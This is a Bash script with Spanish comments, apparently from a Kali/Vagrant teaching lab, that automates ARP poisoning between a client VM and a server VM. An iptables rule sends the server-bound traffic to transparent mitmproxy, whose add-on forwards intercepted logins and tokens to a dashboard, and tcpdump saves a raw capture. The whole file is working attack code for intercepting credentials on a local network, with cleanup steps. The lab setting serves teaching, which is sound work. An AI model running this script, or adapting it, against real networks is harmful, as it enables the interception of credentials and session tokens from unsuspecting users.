#!/usr/bin/env bash
#
# start-attack.sh
# Automatiza el escenario de ataque del laboratorio:
#   1. Habilita el reenvio de paquetes (ya deberia estar activo por Ansible).
#   2. Envenena la tabla ARP de client y server en ambas direcciones,
#      para que todo su trafico pase primero por esta VM (Kali).
#   3. Redirige (iptables REDIRECT) el trafico hacia el puerto del backend
#      a mitmproxy en modo transparente, que lo descifra/decodifica y
#      lo manda como eventos al backend via mitm_bridge.py (Fase 6).
#   4. En paralelo, guarda una captura cruda con tcpdump por si se
#      quiere abrir en Wireshark.
#
# mitmdump NO es un sniffer como tcpdump: para ver el HTTP que pasa por
# aqui necesita actuar como proxy. En modo transparente, el kernel debe
# entregarle esas conexiones el mismo (de ahi la regla de iptables).
#
# Uso (desde dentro de la VM kali, como root o con sudo):
#   sudo ./scripts/start-attack.sh
#
# Para detener el ataque: Ctrl+C. El script limpia iptables, mata los
# procesos y restaura las tablas ARP originales.

set -euo pipefail

CLIENT_IP="192.168.56.10"
SERVER_IP="192.168.56.20"
SERVER_PORT="4000"      # puerto del backend Express (donde viaja el login)
MITMPROXY_PORT="8080"   # puerto local donde escucha mitmdump en modo transparente
IFACE="eth1"            # interfaz de la red interna 192.168.56.0/24 dentro de kali
BRIDGE_SCRIPT="/vagrant/scripts/mitm_bridge.py"
BACKEND_EVENTS_URL="http://${SERVER_IP}:${SERVER_PORT}/api/events"
OUT_DIR="${HOME}/captures"
TIMESTAMP="$(date +%Y%m%d-%H%M%S)"

mkdir -p "${OUT_DIR}"

echo "[*] Habilitando reenvio de paquetes IPv4..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Redirigiendo trafico :${SERVER_PORT} hacia mitmproxy (puerto ${MITMPROXY_PORT})..."
iptables -t nat -A PREROUTING -i "${IFACE}" -p tcp --dport "${SERVER_PORT}" \
  -j REDIRECT --to-port "${MITMPROXY_PORT}"

curl -s -X POST "${BACKEND_EVENTS_URL}" \
  -H "Content-Type: application/json" \
  -d "{\"type\":\"attack-started\",\"sourceIp\":\"$(hostname -I | awk '{print $1}')\",\"targetIp\":\"${CLIENT_IP},${SERVER_IP}\",\"summary\":\"ARP spoofing iniciado\"}" \
  >/dev/null 2>&1 || true

PIDS=()

cleanup() {
  echo ""
  echo "[*] Deteniendo ataque..."
  for pid in "${PIDS[@]}"; do
    kill "${pid}" 2>/dev/null || true
  done

  # -r reestablece las tablas ARP originales de ambos hosts
  arpspoof -r -i "${IFACE}" -t "${CLIENT_IP}" "${SERVER_IP}" >/dev/null 2>&1 || true
  arpspoof -r -i "${IFACE}" -t "${SERVER_IP}" "${CLIENT_IP}" >/dev/null 2>&1 || true

  # Quita la regla de iptables (si falla porque ya no existe, no importa)
  iptables -t nat -D PREROUTING -i "${IFACE}" -p tcp --dport "${SERVER_PORT}" \
    -j REDIRECT --to-port "${MITMPROXY_PORT}" 2>/dev/null || true

  curl -s -X POST "${BACKEND_EVENTS_URL}" \
    -H "Content-Type: application/json" \
    -d "{\"type\":\"attack-stopped\",\"sourceIp\":\"$(hostname -I | awk '{print $1}')\",\"targetIp\":\"${CLIENT_IP},${SERVER_IP}\",\"summary\":\"ARP spoofing detenido\"}" \
    >/dev/null 2>&1 || true

  echo "[*] Listo. Capturas guardadas en ${OUT_DIR}"
}
trap cleanup EXIT INT TERM

echo "[*] Iniciando ARP spoofing entre ${CLIENT_IP} <-> ${SERVER_IP} en ${IFACE}..."
arpspoof -i "${IFACE}" -t "${CLIENT_IP}" "${SERVER_IP}" > "${OUT_DIR}/arpspoof-a-${TIMESTAMP}.log" 2>&1 &
PIDS+=($!)
arpspoof -i "${IFACE}" -t "${SERVER_IP}" "${CLIENT_IP}" > "${OUT_DIR}/arpspoof-b-${TIMESTAMP}.log" 2>&1 &
PIDS+=($!)

echo "[*] Capturando trafico crudo con tcpdump -> ${OUT_DIR}/captura-${TIMESTAMP}.pcap"
tcpdump -i "${IFACE}" -w "${OUT_DIR}/captura-${TIMESTAMP}.pcap" \
  "host ${CLIENT_IP} and host ${SERVER_IP}" &
PIDS+=($!)

echo "[*] Levantando mitmproxy en modo transparente -> ${OUT_DIR}/http-${TIMESTAMP}.flow"
echo "    (mitm_bridge.py manda cada login/token interceptado al dashboard)"
BACKEND_EVENTS_URL="${BACKEND_EVENTS_URL}" mitmdump --mode transparent --showhost \
  --listen-port "${MITMPROXY_PORT}" \
  -s "${BRIDGE_SCRIPT}" \
  -w "${OUT_DIR}/http-${TIMESTAMP}.flow" &
PIDS+=($!)

echo ""
echo "[*] Ataque en marcha. Deja que el cliente use la app y luego revisa:"
echo "      - ${OUT_DIR}/captura-${TIMESTAMP}.pcap   (abrir con Wireshark)"
echo "      - ${OUT_DIR}/http-${TIMESTAMP}.flow       (abrir con: mitmproxy -r <archivo>)"
echo "      - el dashboard, en vivo, si esta corriendo"
echo "[*] Presiona Ctrl+C para detener."
wait
